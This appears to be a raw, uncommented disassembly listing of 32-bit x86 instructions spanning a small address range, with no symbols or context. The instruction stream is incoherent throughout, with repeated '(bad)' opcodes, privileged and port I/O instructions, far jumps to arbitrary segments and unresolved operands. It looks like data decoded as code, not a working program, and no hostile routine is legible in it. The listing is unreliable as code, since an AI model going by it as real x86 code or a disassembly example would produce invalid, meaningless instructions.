  4077b7:	and    BYTE PTR [esi],bl
  4077b9:	mov    al,0x1d
  4077bb:	jae    0x4077b9
  4077bd:	nop
  4077be:	mov    eax,esi
  4077c0:	xor    esp,DWORD PTR [edx]
  4077c2:	dec    esi
  4077c3:	mov    dl,0x63
  4077c5:	push   ds
  4077c6:	call   0x6fdd4cd
  4077cb:	icebp  
  4077cc:	ret    0xe16
  4077cf:	sub    esp,eax
  4077d1:	jmp    0x4077b7
  4077d3:	sti    
  4077d4:	mov    cl,0x74
  4077d6:	sbb    DWORD PTR [ebx+0x457b1924],edi
  4077dc:	mul    BYTE PTR gs:[eax]
  4077df:	lds    eax,FWORD PTR [ecx]
  4077e1:	pop    ss
  4077e2:	mov    edi,0x28ec1d56
  4077e7:	mov    esp,0xa1a8b7f
  4077ec:	out    0x31,eax
  4077ee:	(bad)  
  4077ef:	(bad)  
  4077f0:	aas    
  4077f1:	or     ebx,esp
  4077f3:	leave  
  4077f4:	jmp    0x1966c6a5
  4077f9:	inc    eax
  4077fa:	push   ss
  4077fb:	(bad)  
  4077fc:	adc    al,0x3a
  4077fe:	icebp  
  4077ff:	pop    ebp
  407800:	jbe    0x407837
  407802:	mov    ch,0x79
  407804:	or     cl,BYTE PTR [ecx+0x736db4c2]
  40780a:	sub    al,0x8e
  40780c:	mov    dl,0x77
  40780e:	jbe    0x407808
  407810:	loop   0x4077a9
  407812:	int3   
  407813:	mov    edx,edi
  407815:	sbb    BYTE PTR [edi-0x26],ch
  407818:	rol    bh,1
  40781a:	lods   al,BYTE PTR ds:[esi]
  40781b:	xchg   ebp,eax
  40781c:	mov    al,ds:0x8112395a
  407821:	xor    esi,DWORD PTR [ebp-0x14]
  407824:	test   DWORD PTR [ecx-0x779e8228],edi
  40782a:	inc    esp
  40782b:	std    
  40782c:	out    dx,al
  40782d:	mov    bh,0x8d
  40782f:	pop    esi
  407830:	fdiv   st,st(3)
  407832:	(bad)  
  407833:	imul   ebp,DWORD PTR [ecx-0x7b7702b7],0xffffffd9
  40783a:	in     eax,dx
  40783b:	push   esp
  40783c:	(bad)  
  40783d:	fsub   st(0),st
  40783f:	aaa    
  407840:	mov    ds,ebp
  407842:	adc    eax,0x16e1be0f
  407847:	jmp    0xf794679d
  40784c:	jle    0x4078af
  40784e:	mov    edi,0x3914b39f
  407853:	fimul  WORD PTR [edi-0x69]
  407856:	and    al,0xbe
  407858:	sar    DWORD PTR [eax+0xd083c4c],0x35
  40785f:	call   0x8306:0x13b84390
  407866:	out    dx,al
  407867:	mov    ebp,?
  407869:	xchg   edi,eax
  40786a:	fcmovne st,st(3)
  40786c:	push   cs
  40786d:	hlt    
  40786e:	(bad)  
  40786f:	cmp    eax,DWORD PTR [edx+0x7b]
  407872:	and    edx,DWORD PTR [esp+ebx*4+0x25]
  407876:	sbb    ecx,DWORD PTR [esi]
  407878:	mov    bl,0xc3
  40787a:	call   DWORD PTR ds:0x9216bd11
  407880:	sub    bx,WORD PTR [ebp-0x36]
  407884:	cld    
  407885:	xchg   DWORD PTR [esi-0x392ebe9b],esp
  40788b:	push   ecx
  40788c:	mov    BYTE PTR [ebx-0x2693ea9e],bh
  407892:	cmc    
  407893:	xlat   BYTE PTR ds:[ebx]
  407894:	adc    eax,0x553083aa
  407899:	push   esp
  40789a:	lods   eax,DWORD PTR ds:[esi]
  40789b:	add    eax,0xb726d3fe
  4078a0:	jne    0x40790f
  4078a2:	out    dx,eax
  4078a3:	or     DWORD PTR [edx+edi*4-0x4a],ecx
  4078a7:	lds    esp,FWORD PTR [ecx]
  4078a9:	out    0x2f,al
  4078ab:	ins    BYTE PTR es:[edi],dx
  4078ac:	pop    eax
  4078ad:	xchg   edx,eax
  4078ae:	cmp    al,0x2d
  4078b0:	pop    ss
  4078b1:	stc    
  4078b2:	out    dx,al
  4078b3:	pop    ecx
  4078b4:	ret    
  4078b5:	test   eax,0x85130257
  4078ba:	push   ebx
  4078bb:	aam    0xde
  4078bd:	mov    dl,BYTE PTR [esp+eax*8-0x9e319b0]
  4078c4:	shl    BYTE PTR [eax+0x2a],1
  4078c7:	fmul   DWORD PTR [esi]
  4078c9:	jg     0x4078dd
  4078cb:	sbb    DWORD PTR [edi],ebx
  4078cd:	lea    ecx,[ecx+ebp*8+0x44]
  4078d1:	lods   eax,DWORD PTR ds:[esi]
  4078d2:	fisub  DWORD PTR [edx]
  4078d4:	pop    ebp
  4078d5:	dec    eax
  4078d6:	pop    ebx
  4078d7:	inc    BYTE PTR [ecx]
  4078d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078da:	mov    eax,ds:0x4ca3d6d8
  4078df:	cmp    esi,DWORD PTR [eax-0x340c5806]
  4078e5:	lds    eax,FWORD PTR [edx-0x329166aa]
  4078eb:	cmp    ch,BYTE PTR [esi-0x25]
  4078ee:	jmp    0xb0ae04de
  4078f3:	inc    ebx
  4078f4:	adc    DWORD PTR [esi+edi*8],ebp
  4078f7:	xor    eax,0x109d86d6
  4078fc:	jno    0x4078be
  4078fe:	add    BYTE PTR [eax],cl
  407900:	ss jb  0x407924
  407903:	xchg   edx,eax
  407904:	repz (bad) 
  407907:	jg     0x4078b2
  407909:	loop   0x407977
  40790b:	pop    edi
  40790c:	pop    ebp
  40790d:	sbb    esp,DWORD PTR [ebp-0x7759667f]
  407913:	pusha  
  407914:	inc    edi
  407915:	and    DWORD PTR [eax],edi
  407917:	test   eax,0x5aed0056
  40791c:	pop    edi
  40791d:	mov    esp,0xa5054a7a
  407922:	fsubp  st(1),st
  407924:	mov    ah,0x1d
  407926:	inc    esi
  407927:	pop    eax
  407928:	(bad)  
  407929:	ds mov cl,0xa
  40792c:	lock out 0x4a,al
  40792f:	loope  0x407959
  407931:	mov    ebx,0xdb1b5ad7
  407936:	(bad)  
  407938:	outs   dx,DWORD PTR ds:[esi]
  407939:	les    esi,FWORD PTR [eax]
  40793b:	adc    BYTE PTR [edx+0x26066ea8],dh
  407941:	cmc    
  407942:	jecxz  0x40799e
  407944:	outs   dx,DWORD PTR ds:[esi]
  407945:	shl    DWORD PTR [ecx+0x4e084a7a],0x4f
  40794c:	lahf   
  40794d:	and    BYTE PTR [ecx],cl
  40794f:	fidivr WORD PTR [edx-0x73]
  407952:	lea    ecx,[edi+0x68]
  407955:	jmp    0xf2b605cd
  40795a:	mov    eax,0x557affc
  40795f:	sbb    BYTE PTR [eax],dl
  407961:	push   ss
  407962:	call   0x497d:0x9a788ef3
  407969:	jmp    0x678c:0x19b037f1
  407970:	cmc    
  407971:	mov    eax,0x8592f624
  407976:	retf   0xb515
  407979:	xchg   esp,eax
  40797a:	adc    BYTE PTR [ecx],bh
  40797c:	fnsave ds:0x698f4874
  407982:	or     al,0x84
  407984:	cld    
  407985:	lods   eax,DWORD PTR ds:[esi]
  407986:	push   esp
  407987:	xor    esi,DWORD PTR [edi]
  407989:	es pop ebx
  40798b:	scas   al,BYTE PTR es:[edi]
  40798c:	sbb    eax,0xd209a4e5
  407991:	ret    
  407992:	mov    eax,ds:0xa1bb3dce
  407997:	dec    eax
  407998:	popf   
  407999:	pop    eax
  40799a:	sbb    edi,ebx
  40799c:	xor    al,0x45
  40799e:	sar    al,0xd3
  4079a1:	inc    esp
  4079a2:	std    
  4079a3:	(bad)  
  4079a4:	fidiv  WORD PTR [esi]
  4079a6:	loop   0x4079e3
  4079a8:	sub    BYTE PTR [edi+0x7a24b4e3],dl
  4079ae:	ins    DWORD PTR es:[edi],dx
  4079af:	popa   
  4079b0:	lock or BYTE PTR [ecx-0x54],al
  4079b4:	and    eax,0x723532ec
  4079b9:	fild   DWORD PTR [ecx+0x68241610]
  4079bf:	sub    DWORD PTR [edx-0x28],edi
  4079c2:	cs jmp 0xaecc:0x7c73118
  4079ca:	or     DWORD PTR [esi+0x2dd7067f],ecx
  4079d0:	test   al,0x80
  4079d2:	in     al,0xcd
  4079d4:	jmp    0x407a18
  4079d6:	pushf  
  4079d7:	rcl    DWORD PTR [edx+0x3e976ae],1
  4079dd:	add    ecx,esi
  4079df:	push   eax
  4079e0:	pop    ds
  4079e1:	(bad)  
  4079e2:	cmp    DWORD PTR [esi],esp
  4079e4:	imul   edx,DWORD PTR [eax+0x7c9297eb],0x7637939c
  4079ee:	ds fs mov di,0x1d9d
  4079f4:	pop    es
  4079f5:	fidiv  WORD PTR [edi-0x1c2d64f8]
  4079fb:	lea    eax,[ebx]
  4079fd:	daa    
  4079fe:	sub    edx,DWORD PTR [edi]
  407a00:	adc    DWORD PTR [edi-0x7e83928e],eax
  407a06:	fs stos DWORD PTR es:[edi],eax
  407a08:	in     eax,0xb8
  407a0a:	xor    bl,bh
  407a0c:	inc    eax
  407a0d:	xchg   esi,eax
  407a0e:	(bad)  
  407a0f:	mul    edi
  407a11:	xor    cl,BYTE PTR [esi]
  407a13:	clc    
  407a14:	jge    0x407a21
  407a16:	xor    esi,DWORD PTR [ecx+0x55]
  407a19:	cld    
  407a1a:	cmp    DWORD PTR [esi+0x6f47b34d],0xffffffa4
  407a21:	stos   DWORD PTR es:[edi],eax
  407a22:	rol    edi,cl
  407a24:	scas   al,BYTE PTR es:[di]
  407a26:	test   eax,0xeb3a8a83
  407a2b:	jo     0x407a47
  407a2d:	inc    eax
  407a2e:	mov    esp,0xa9cc1f6a
  407a33:	inc    edi
  407a34:	clc    
  407a35:	es cmp al,bh
  407a38:	stos   BYTE PTR es:[edi],al
  407a39:	jg     0x407a5b
  407a3b:	cld    
  407a3c:	lahf   
  407a3d:	cmc    
  407a3e:	outs   dx,BYTE PTR ds:[esi]
  407a3f:	sub    ebp,DWORD PTR [edx-0x54037fa7]
  407a45:	lods   al,BYTE PTR ds:[esi]
  407a46:	push   cs
  407a47:	in     al,0xfb
  407a49:	loope  0x407ac3
  407a4b:	mov    bh,0x1b
  407a4d:	lea    esp,[esi]
  407a4f:	cmp    al,0xc4
  407a51:	add    edi,DWORD PTR [edx+0x67dca68e]
  407a57:	inc    ebp
  407a58:	(bad)  
  407a59:	mov    edi,0x857a4c17
  407a5e:	sub    al,0x69
  407a60:	sti    
  407a61:	int    0x9a
  407a63:	pop    es
  407a64:	sub    BYTE PTR cs:[esi],dh
  407a67:	inc    ebx
  407a68:	xor    DWORD PTR [eax-0x1e],0x4d32e5be
  407a6f:	hlt    
  407a70:	cmp    al,dh
  407a72:	mov    edx,0x812793cd
  407a77:	inc    eax
  407a78:	pusha  
  407a79:	and    cl,BYTE PTR [ecx-0x53]
  407a7c:	xor    eax,0xfc06de9f
  407a81:	pop    esp
  407a82:	jg     0x407a34
  407a84:	mov    WORD PTR [edx],gs
  407a86:	outs   dx,DWORD PTR ds:[esi]
  407a87:	fwait
  407a88:	xor    BYTE PTR [ecx],bh
  407a8a:	icebp  
  407a8b:	mov    al,0xd3
  407a8d:	mov    esp,0x2581c56
  407a92:	aaa    
  407a93:	shl    ebp,cl
  407a95:	test   eax,0xbbed5608
  407a9a:	into   
  407a9b:	out    dx,eax
  407a9c:	arpl   WORD PTR [eax+0x41],sp
  407a9f:	jg     0x407a3e
  407aa1:	pop    ebp
  407aa2:	and    BYTE PTR [ebp+eax*4-0x4f5c02c1],bh
  407aa9:	stos   BYTE PTR es:[edi],al
  407aaa:	or     al,0x32
  407aac:	and    DWORD PTR [eax+0x57],ebp
  407aaf:	xchg   DWORD PTR [edx+0x4c],edx
  407ab2:	jno    0x407a5f
  407ab4:	mov    ss,WORD PTR [esi+eiz*4-0x28403d39]
  407abb:	mov    eax,0x4fc98bd3
  407ac0:	pop    eax
  407ac1:	sbb    al,BYTE PTR [ecx]
  407ac3:	aas    
  407ac4:	jmp    0xbb1b5061
  407ac9:	mov    ds:0x66341eb5,al
  407ace:	mov    ds:0xa17116ee,al
  407ad3:	jno    0x407a55
  407ad5:	push   ds
  407ad6:	es or  eax,0x94dad212
  407adc:	dec    esi
  407add:	retf   
  407ade:	xchg   ebp,eax
  407adf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ae0:	sbb    al,ah
  407ae2:	push   ds
  407ae3:	xor    al,0xa5
  407ae5:	sub    al,0xd9
  407ae7:	push   esp
  407ae8:	adc    dl,BYTE PTR ds:0x63675f14
  407aee:	pcmpeqw mm3,QWORD PTR [edx+0x32]
  407af2:	fnstcw WORD PTR [ebp+edi*2+0x32d059f5]
  407af9:	mov    ecx,0xbf78ebcb
  407afe:	mov    bl,0x14
  407b00:	sub    edx,DWORD PTR [ecx+0x35]
  407b03:	push   es
  407b04:	or     bl,cl
  407b06:	in     al,dx
  407b07:	push   ss
  407b08:	mov    cl,0xbd
  407b0a:	xchg   esi,ebp
  407b0c:	dec    esp
  407b0d:	test   eax,0xc3fd1a0
  407b12:	mov    edi,0xf10cf0af
  407b17:	mov    BYTE PTR [esi+0x7109d4ba],al
  407b1d:	push   0xffffffcc
  407b1f:	fisttp WORD PTR ds:0xfb79ca9f
  407b25:	mov    dl,0x96
  407b27:	and    dl,BYTE PTR es:[edi+0x2dbff73b]
  407b2e:	xchg   DWORD PTR [edi+0x313804cb],edx
  407b34:	(bad)  
  407b35:	pop    ss
  407b36:	mov    ?,edx
  407b38:	inc    edx
  407b39:	jnp    0x407b5d
  407b3b:	sbb    DWORD PTR [ebx-0x7eb1d4c8],ebp
  407b41:	cmp    DWORD PTR [edx-0x31],0xffffffe9
  407b45:	jae    0x407bc5
  407b47:	imul   esp,DWORD PTR [eax+0x14],0x34
  407b4b:	call   0x5084:0x73a2d5b5
  407b52:	repnz lods al,BYTE PTR ds:[esi]
  407b54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b55:	mov    ecx,0x2c82126e
  407b5a:	adc    al,0xbe
  407b5c:	add    al,0x88
  407b5e:	addr16 xchg edx,eax
  407b60:	and    al,0xa5
  407b62:	jae    0x407b5e
  407b64:	adc    eax,0xa237aeb1
  407b69:	pop    edi
  407b6a:	pop    ebp
  407b6b:	leave  
  407b6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b6d:	pusha  
  407b6e:	add    BYTE PTR [ebp-0x337e4182],ah
  407b74:	mov    bh,0x20
  407b76:	jne    0x407bc0
  407b78:	imul   edi,edx,0x1a
  407b7b:	rol    BYTE PTR [ebp-0x2],cl
  407b7e:	fwait
  407b7f:	jmp    0xd9347b40
  407b84:	sub    dl,BYTE PTR [edi]
  407b86:	or     esi,DWORD PTR gs:[esi]
  407b89:	sahf   
  407b8a:	mov    edx,0xb97e3dbc
  407b8f:	pop    ss
  407b90:	push   edi
  407b91:	push   ebp
  407b92:	loopne 0x407b17
  407b94:	shl    DWORD PTR [ecx-0xe],cl
  407b97:	das    
  407b98:	retf   0x4b25
  407b9b:	lock scas eax,DWORD PTR es:[edi]
  407b9d:	dec    ebp
  407b9e:	xor    DWORD PTR [edx],edi
  407ba0:	or     ch,BYTE PTR [edx-0x2b8b2cd4]
  407ba6:	(bad)  
  407ba7:	push   ds
  407ba8:	mov    al,0x27
  407baa:	test   eax,0x4a723d19
  407baf:	(bad)  
  407bb0:	mov    ebp,0xac6dfb6a
  407bb5:	jns    0x407bfc
  407bb7:	push   ecx
  407bb8:	sub    dl,ah
  407bba:	fmul   QWORD PTR [esp+edx*1]
  407bbd:	sbb    eax,0x895724ec
  407bc2:	inc    ecx
  407bc3:	sbb    DWORD PTR [esi-0x1c3c7245],ebp
  407bc9:	mov    dl,BYTE PTR ds:0x632296aa
  407bcf:	mov    esi,0x3ea150ad
  407bd4:	jb     0x407c37
  407bd6:	shr    DWORD PTR [eax-0x7b60a277],0x4f
  407bdd:	lahf   
  407bde:	sub    eax,DWORD PTR [esi-0x80]
  407be1:	mov    ebx,0xc796fb56
  407be6:	rol    DWORD PTR [edx-0x34118915],cl
  407bec:	push   edi
  407bed:	jnp    0x407be8
  407bef:	ja     0x407c14
  407bf1:	or     eax,DWORD PTR [ecx]
  407bf3:	and    al,0x60
  407bf5:	mov    dh,0x13
  407bf7:	fwait
  407bf8:	iret   
  407bf9:	inc    edi
  407bfa:	sbb    al,0xcd
  407bfc:	sub    eax,DWORD PTR ds:[ebp+0x4b1ba5e3]
  407c03:	adc    BYTE PTR [edi+edi*4-0x70],dh
  407c07:	sbb    al,0xe0
  407c09:	xchg   esi,eax
  407c0a:	rcl    ebx,cl
  407c0c:	adc    BYTE PTR [edx-0x73],bh
  407c0f:	rcl    DWORD PTR [eax],cl
  407c11:	sar    DWORD PTR fs:[esp+ecx*1-0x3a],1
  407c16:	or     esp,0x66
  407c19:	cmc    
  407c1a:	rcl    eax,1
  407c1c:	xor    eax,0xfa9c6f0b
  407c21:	fsubr  QWORD PTR [ecx-0x22bf39c8]
  407c27:	add    edi,edx
  407c29:	ficomp WORD PTR [edi+esi*2+0x30]
  407c2d:	xor    esi,DWORD PTR ds:0x3e34bf03
  407c33:	clc    
  407c34:	or     al,0x4c
  407c36:	(bad)  
  407c37:	outs   dx,DWORD PTR ds:[esi]
  407c38:	bound  ebp,QWORD PTR [edx]
  407c3a:	popf   
  407c3b:	call   0x9f7e113e
  407c40:	xchg   esi,eax
  407c41:	xchg   edi,eax
  407c42:	cmp    dh,dh
  407c44:	sub    ebp,ecx
  407c46:	outs   dx,DWORD PTR ds:[esi]
  407c47:	loopne 0x407beb
  407c49:	adc    bl,ch
  407c4b:	ret    0x359a
  407c4e:	rol    ch,0x26
  407c51:	or     al,0x12
  407c53:	add    ah,BYTE PTR [ebx]
  407c55:	imul   esp,ecx,0x12dbe138
  407c5b:	jb     0x407cc7
  407c5d:	out    dx,eax
  407c5e:	push   ecx
  407c5f:	(bad)  
  407c60:	sub    al,0x87
  407c62:	(bad)  
  407c63:	mov    ds:0xbe02bf7f,al
  407c68:	push   eax
  407c69:	test   esp,0x8e82bf30
  407c6f:	lock add ah,dl
  407c72:	out    0x1c,al
  407c74:	xor    ebp,esi
  407c76:	icebp  
  407c77:	mov    ds:0x119871e2,eax
  407c7c:	push   esi
  407c7d:	imul   ebx,edi,0x3d10cd55
  407c83:	loop   0x407ca4
  407c85:	dec    ebp
  407c86:	mov    edi,0x9985f3d4
  407c8b:	mov    dh,al
  407c8d:	jae    0x407c52
  407c8f:	in     eax,dx
  407c90:	inc    esi
  407c91:	or     BYTE PTR ds:0x8d24fe10,bh
  407c97:	retf   
  407c98:	add    WORD PTR [ecx+0x1be41091],di
  407c9f:	push   ebp
  407ca0:	xchg   edi,eax
  407ca1:	xor    al,0x21
  407ca3:	pop    ecx
  407ca4:	cmp    cl,ah
  407ca6:	std    
  407ca7:	rcr    DWORD PTR [ebx+edx*8-0x74],1
  407cab:	jg     0x407ca2
  407cad:	mov    esi,0x794c4136
  407cb2:	adc    esp,ebx
  407cb4:	retf   
  407cb5:	iret   
  407cb6:	icebp  
  407cb7:	mov    dh,0xfa
  407cb9:	imul   ebp,DWORD PTR [edi+0x4c],0x7a
  407cbd:	mov    DWORD PTR es:[ebx-0x24],edi
  407cc1:	mov    bh,0x14
  407cc3:	add    al,0x10
  407cc5:	pop    edi
  407cc6:	add    al,0x6d
  407cc8:	sahf   
  407cc9:	jnp    0x407d16
  407ccb:	jp     0x407c5b
  407ccd:	push   ss
  407cce:	fisub  DWORD PTR es:[eax]
  407cd1:	dec    DWORD PTR [esi+0x311f18c7]
  407cd7:	dec    edi
  407cd8:	adc    ebp,eax
  407cda:	addr16 and eax,0xf6f59495
  407ce0:	cwde   
  407ce1:	call   0xa657:0x565f4dc2
  407ce8:	cmp    bh,dl
  407cea:	fadd   DWORD PTR [eax+edx*4-0x59cd93b5]
  407cf1:	add    eax,0xe4053e40
  407cf6:	icebp  
  407cf7:	into   
  407cf8:	test   DWORD PTR [edx-0x6210077e],0x647ae301
  407d02:	lea    ebx,[edx+0x6c]
  407d05:	out    0x4d,al
  407d07:	cs ds push esp
  407d0a:	popf   
  407d0b:	push   ss
  407d0c:	ret    
  407d0d:	or     al,BYTE PTR [ebx]
  407d0f:	pop    ebx
  407d10:	pop    es
  407d11:	loopne 0x407ce5
  407d13:	into   
  407d14:	dec    eax
  407d15:	dec    ebx
  407d16:	ins    BYTE PTR es:[edi],dx
  407d17:	xor    al,0x56
  407d19:	mov    bl,0x23
  407d1b:	sbb    al,0x24
  407d1d:	adc    DWORD PTR [ebp-0x1777db81],edx
  407d23:	std    
  407d24:	ins    BYTE PTR es:[edi],dx
  407d25:	ret    0x5d5e
  407d28:	xor    edx,DWORD PTR [ebp+0x2371f78e]
  407d2e:	and    edi,DWORD PTR [ebx+0x6c]
  407d31:	xchg   ebp,eax
  407d32:	popf   
  407d33:	ret    0xf72e
  407d36:	outs   dx,DWORD PTR ds:[esi]
  407d37:	jns    0x407d5e
  407d39:	ss es loopne 0x407d28
  407d3d:	icebp  
  407d3e:	sbb    eax,edi
  407d40:	mov    ebx,0x7759323
  407d45:	push   ecx
  407d46:	in     eax,0x34
  407d48:	add    al,0x7f
  407d4a:	mov    eax,ecx
  407d4c:	cmp    al,0x62
  407d4e:	out    dx,eax
  407d4f:	adc    esp,DWORD PTR [esi+0x7cd5f21e]
  407d55:	gs dec ecx
  407d57:	cmp    ecx,DWORD PTR [eax+0x4e]
  407d5a:	or     eax,0x59855bce
  407d5f:	nop
  407d60:	(bad)  
  407d61:	jecxz  0x407d25
  407d63:	lahf   
  407d64:	jnp    0x407d6d
  407d66:	and    BYTE PTR [eax+0x8],bh
  407d69:	and    eax,0x48569059
  407d6e:	dec    esi
  407d6f:	pop    es
  407d70:	sti    
  407d71:	dec    edx
  407d72:	xchg   ebx,eax
  407d73:	push   ebp
  407d74:	inc    edx
  407d75:	xor    al,0x61
  407d77:	inc    ebp
  407d78:	inc    ecx
  407d79:	out    0xbe,eax
  407d7b:	sub    eax,0x4baffc62
  407d80:	add    esi,DWORD PTR fs:[edi+0xc]
  407d84:	lahf   
  407d85:	in     eax,0xb8
  407d87:	into   
  407d88:	or     eax,0x63a752b1
  407d8d:	ins    BYTE PTR es:[edi],dx
  407d8e:	mov    WORD PTR [ebx-0x12c36cf],?
  407d94:	int3   
  407d95:	sbb    esp,eax
  407d97:	lahf   
  407d98:	in     eax,0xac
  407d9a:	call   0x98de6bd
  407d9f:	mov    ch,0x8b
  407da1:	imul   esi,DWORD PTR [edx+0x5e],0xffffffa5
  407da5:	inc    BYTE PTR [eax-0x29fa0b97]
  407dab:	mov    ds:0xc13d44f1,eax
  407db0:	push   edx
  407db1:	inc    edi
  407db2:	jg     0x407d8c
  407db4:	xchg   edi,eax
  407db5:	xor    eax,0xdfb7a4d9
  407dba:	add    eax,0x49f3734a
  407dbf:	sbb    DWORD PTR [ebp+edi*8-0x38],ebp
  407dc3:	test   DWORD PTR [ebx+0x2a4a2c97],esp
  407dc9:	mov    ebx,0x9c7a04ec
  407dce:	push   edi
  407dcf:	lea    edx,[bp+di+0x45]
  407dd3:	xchg   esi,eax
  407dd4:	outs   dx,DWORD PTR ds:[esi]
  407dd5:	lgs    esi,FWORD PTR [esi]
  407dd8:	or     al,0xd4
  407dda:	mov    esi,0x97d9cb10
  407ddf:	not    BYTE PTR [ebx]
  407de1:	add    edi,ebp
  407de3:	out    0x82,al
  407de5:	cmp    esp,ecx
  407de7:	jnp    0x407e5e
  407de9:	inc    BYTE PTR [ebx-0x4fa16614]
  407def:	jnp    0x407e5b
  407df1:	inc    ecx
  407df2:	pop    edx
  407df3:	mov    ecx,0x36124b65
  407df8:	fnstsw WORD PTR [edi+ebx*1+0x18]
  407dfc:	aaa    
  407dfd:	add    BYTE PTR [ecx+0x7c],0xa9
  407e01:	xor    bh,dh
  407e03:	and    bh,BYTE PTR [edx-0x35771da6]
  407e09:	xor    DWORD PTR [ebp-0x4b],edx
  407e0c:	(bad)  
  407e0d:	mov    edx,0x2bfc7736
  407e12:	sub    al,0x41
  407e14:	jmp    0x93e252d0
  407e19:	pop    ecx
  407e1a:	lods   al,BYTE PTR ds:[esi]
  407e1b:	add    eax,0x1ec08602
  407e20:	pop    edi
  407e21:	cli    
  407e22:	nop
  407e23:	stc    
  407e24:	into   
  407e25:	inc    esi
  407e26:	xchg   ebx,eax
  407e27:	out    0x32,al
  407e29:	adc    ebx,edx
  407e2b:	imul   edi,DWORD PTR [edi-0x3cb884f8],0x22
  407e32:	test   BYTE PTR [ebx+0x49],cl
  407e35:	out    0x28,eax
  407e37:	add    al,cl
  407e39:	sub    esi,edx
  407e3b:	cli    
  407e3c:	jne    0x407e95
  407e3e:	je     0x407e4e
  407e40:	sar    BYTE PTR [ecx+0x16],cl
  407e43:	mov    edi,0xfdcaad36
  407e48:	test   eax,0xbf8c3317
  407e4d:	jno    0x407e09
  407e4f:	jb     0x407e94
  407e51:	lahf   
  407e52:	popa   
  407e53:	std    
  407e54:	pushf  
  407e55:	out    0xa1,eax
  407e57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e58:	and    edx,edi
  407e5a:	leave  
  407e5b:	push   edx
  407e5c:	loope  0x407ed5
  407e5e:	adc    DWORD PTR [ecx+ebx*1+0x7c3d7244],eax
  407e65:	fs jae 0x407e4c
  407e68:	mov    al,0xbd
  407e6a:	cwde   
  407e6b:	shr    BYTE PTR [ecx+0x71],1
  407e6e:	mov    cl,0xf8
  407e70:	pop    esi
  407e71:	dec    esp
  407e72:	jmp    FWORD PTR [edx+0x7568ee44]
  407e78:	or     edx,DWORD PTR ds:0x702f24a8
  407e7e:	add    DWORD PTR [eax+0x5e],0xe5ce5e05
  407e85:	loopne 0x407e9e
  407e87:	outs   dx,DWORD PTR ds:[esi]
  407e88:	cmc    
  407e89:	sti    
  407e8a:	dec    esp
  407e8b:	lahf   
  407e8c:	nop
  407e8d:	pop    es
  407e8e:	out    dx,al
  407e8f:	inc    edx
  407e90:	test   eax,0x2b77ab7d
  407e95:	test   DWORD PTR [esi-0x6a],ebp
  407e98:	mov    bl,0x76
  407e9a:	fisub  WORD PTR [esi]
  407e9c:	in     al,dx
  407e9d:	pop    edx
  407e9e:	pop    eax
  407e9f:	idiv   ecx
  407ea1:	retf   0x8f70
  407ea4:	and    al,0x92
  407ea6:	push   edi
  407ea7:	xchg   ebp,eax
  407ea8:	dec    esp
  407ea9:	ror    DWORD PTR [esi-0x32a2f0b6],1
  407eaf:	mov    ebp,0xf6c811c1
  407eb4:	mov    esp,ds
  407eb6:	in     al,dx
  407eb7:	fstp   TBYTE PTR [edx+0x7b43d0a2]
  407ebd:	outs   dx,BYTE PTR ds:[esi]
  407ebe:	mov    cs,WORD PTR [edi-0x61]
  407ec1:	add    al,0x11
  407ec3:	jns    0x407f2d
  407ec5:	push   edx
  407ec6:	or     al,0x16
  407ec8:	stc    
  407ec9:	ror    edx,cl
  407ecb:	jle    0x407f0d
  407ecd:	(bad)  
  407ece:	cld    
  407ecf:	cmc    
  407ed0:	push   edi
  407ed1:	scas   al,BYTE PTR es:[edi]
  407ed2:	js     0x407ee7
  407ed4:	lds    esi,FWORD PTR [eax-0x27]
  407ed7:	push   eax
  407ed8:	mov    ch,0x4c
  407eda:	retf   0xff0d
  407edd:	pop    ecx
  407ede:	rol    DWORD PTR [ebp-0x38],1
  407ee1:	jne    0x407ec4
  407ee3:	xor    al,0xc9
  407ee5:	cmc    
  407ee6:	dec    esp
  407ee7:	or     al,0x7e
  407ee9:	dec    edx
  407eea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407eeb:	int    0x73
  407eed:	xor    esi,DWORD PTR [eax]
  407eef:	push   esi
  407ef0:	shl    DWORD PTR es:[ebx+0x37],1
  407ef4:	rol    edi,cl
  407ef6:	cmp    edx,DWORD PTR [ecx-0x7b]
  407ef9:	xchg   edi,eax
  407efa:	sbb    DWORD PTR [ebx+edx*4],esp
  407efd:	fdiv   DWORD PTR [esi+0x6a188992]
  407f03:	cmp    eax,0x7facfb4b
  407f08:	dec    ecx
  407f09:	sub    DWORD PTR [edx],eax
  407f0b:	bound  esi,QWORD PTR [edi+edi*2-0x4f]
  407f0f:	leave  
  407f10:	jl     0x407ed3
  407f12:	jp     0x407eb8
  407f14:	scas   al,BYTE PTR es:[edi]
  407f15:	enter  0x9d8,0xc7
  407f19:	pop    ebp
  407f1a:	enter  0xa5a5,0x83
  407f1e:	not    eax
  407f20:	xchg   ebp,eax
  407f21:	ret    0x9033
  407f24:	cmp    eax,0x4df28afe
  407f29:	js     0x407ebd
  407f2b:	dec    esi
  407f2c:	dec    ecx
  407f2d:	mov    ds:0x374569e3,al
  407f32:	stos   DWORD PTR es:[edi],eax
  407f33:	mov    BYTE PTR [ecx],ch
  407f35:	int3   
  407f36:	xchg   ebp,eax
  407f37:	xchg   DWORD PTR [edi+0x3f],ebx
  407f3a:	and    dl,BYTE PTR [ebp+0x48]
  407f3d:	shl    DWORD PTR [esi-0x7f10f157],0x14
  407f44:	dec    esi
  407f45:	cmp    ebx,ecx
  407f47:	fild   DWORD PTR [edx-0x4c8810a]
  407f4d:	xchg   edi,eax
  407f4e:	jmp    0x407f78
  407f50:	aam    0xe2
  407f52:	cmp    al,0xe9
  407f54:	adc    al,0x49
  407f56:	mov    WORD PTR [eax-0x4f145ce2],ds
  407f5c:	ss sub eax,0x203c7c78
  407f62:	arpl   si,bp
  407f64:	stc    
  407f65:	aas    
  407f66:	test   eax,0xa58e00b8
  407f6b:	jae    0x407f02
  407f6d:	stc    
  407f6e:	daa    
  407f6f:	test   BYTE PTR [ebp-0x2bb8d4b],ch
  407f75:	xor    ecx,DWORD PTR [ebx]
  407f77:	outs   dx,BYTE PTR ds:[esi]
  407f78:	xchg   esi,eax
  407f79:	jae    0x407f6c
  407f7b:	fisubr WORD PTR [edx]
  407f7d:	imul   esp,DWORD PTR [ecx+0x4aa8236c],0x48b835
  407f87:	pop    edx
  407f88:	sub    al,0x63
  407f8a:	inc    eax
